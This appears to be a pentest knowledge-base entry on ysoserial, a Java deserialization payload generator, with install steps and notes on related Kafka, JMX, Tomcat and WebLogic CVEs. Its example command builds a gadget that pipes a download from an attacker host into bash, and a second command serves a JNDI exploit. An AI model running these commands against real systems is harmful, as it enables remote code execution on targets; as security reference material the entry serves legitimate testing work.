# ysoserial

**Tags:** `#ysoserial` `#deserialization` `#java` `#gadgetchain` `#rce` `#jndi` `#jmx`

Java deserialization payload generator. Produces serialized objects that trigger **gadget chains** (Commons-Collections, Spring, Groovy, etc.) in a vulnerable target's `readObject()`, yielding code execution. The standard tool wherever untrusted Java serialized data is deserialized — including JNDI/LDAP lookup responses and JMX/RMI channels. Pair with a malicious JNDI/LDAP server (e.g. **marshalsec**) when the sink is a JNDI lookup rather than a raw byte stream.

**Source:** https://github.com/frohoff/ysoserial
**Install:** download the release JAR, or build with Maven (`mvn package`); run with `java -jar ysoserial.jar`

```bash
# Generate a CommonsCollections gadget that runs a command
java -jar ysoserial.jar CommonsCollections7 'curl http://<attacker>/x|bash' > payload.bin

# List available gadget chains
java -jar ysoserial.jar --help

# Serve a JNDI/LDAP gadget (with marshalsec) — the sink resolves ldap://attacker/obj
# java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://<attacker>:8000/#Exploit"
```

> [!note] **See also** — [[Services/Cloud & Data/Kafka|Apache Kafka]] — used for the Kafka Connect SASL-JAAS/JNDI RCE (CVE-2023-25194 / CVE-2025-27818) and the JMX deserialization RCE (CVE-2025-27819) gadget chains. Also [[Services/Web Services/JMX|JMX]] — gadget-chain payloads for RMI/JMX deserialization (paired with `rmg`/beanshooter). Also [[Services/Web Services/Tomcat|Tomcat]] — serialized `.session` gadget for the CVE-2025-24813 partial-PUT deserialization RCE. Also [[Services/Web Services/WebLogic|WebLogic]] — gadget payloads for T3/IIOP deserialization.
> Also used in [[Techniques/Deserialization|Deserialization]], [[Techniques/Non-PHP Web App Attacks|Non-PHP Web App Attacks]].

---

*Created: 2026-07-29*
*Updated: 2026-09-25*
*Model: claude-opus-5*
